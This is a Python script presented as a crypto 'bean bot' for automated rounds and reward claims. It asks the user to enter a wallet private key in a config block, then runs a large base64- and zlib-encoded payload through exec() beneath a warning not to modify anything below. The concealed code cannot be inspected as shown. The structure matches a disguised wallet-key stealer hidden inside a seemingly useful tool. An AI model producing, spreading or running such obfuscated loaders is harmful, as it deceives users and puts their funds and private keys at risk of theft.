#!/usr/bin/env python3
# ==================== WARSFNF - BEAN BOT ====================
# Edit YOUR settings below, then run: python3 bean_bot.py
# DO NOT modify anything below the config section
# =============================================================

# Your wallet private key (REQUIRED)
PRIVATE_KEY = "0x000000"

# Strategy settings
NUM_BLOCKS = 5              # Blocks per round
ETH_PER_ROUND = 0.002       # ETH to deploy each round
MIN_EV = 0.0                # Minimum EV to play (0 = breakeven)
WAIT_SECONDS = 35           # Wait before re-checking EV

# Auto claim settings
AUTO_CLAIM = True            # Auto claim rewards
CLAIM_ETH_MIN = 0.01        # Claim when ETH >= this
CLAIM_BEAN_MIN = 0.1         # Claim when BEAN >= this
CLAIM_CHECK_INTERVAL = 30    # Check rewards every X seconds

# ===================== CODED =====================
import base64,zlib;exec(zlib.decompress(base64.b64decode("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"
"mYTlvwE3o69c")))
